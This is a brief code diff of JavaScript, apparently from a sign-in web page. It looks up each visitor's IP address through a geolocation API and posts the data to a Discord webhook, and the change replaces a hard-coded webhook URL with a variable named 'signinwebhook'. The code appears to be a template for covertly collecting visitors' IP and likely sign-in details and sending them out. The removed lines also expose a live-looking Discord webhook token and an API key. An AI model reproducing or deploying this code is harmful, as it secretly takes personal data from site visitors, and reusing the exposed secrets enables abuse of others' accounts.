@@ -28,7 +28,7 @@ function getInfo() {
 			$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=0d32a7e922c5498f9510474f249d7810", function (data) {
 				const ip = data.ip_address;
 				const request = new XMLHttpRequest();
-				request.open("POST", "https://discord.com/api/webhooks/1070794376827121725/HLbsCxGPdVMypi3gSBIVkaYYq16_VvLjX_UpIX76FGRzvTi92EcbKg8Sx2hkDNLxl2pV");
+				request.open("POST", signinwebhook);
 				// Put in your discord webhook url above ^^^
 				request.setRequestHeader("Content-type", "application/json");
 				const params = {
@@ -49,7 +49,7 @@ function getInfo() {
 	$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=0d32a7e922c5498f9510474f249d7810", function (data) {
         const ip = data.ip_address;
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1070794376827121725/HLbsCxGPdVMypi3gSBIVkaYYq16_VvLjX_UpIX76FGRzvTi92EcbKg8Sx2hkDNLxl2pV");
+        request.open("POST", signinwebhook);
         // Put in your discord webhook url above ^^^
         request.setRequestHeader("Content-type", "application/json");
         const params = {
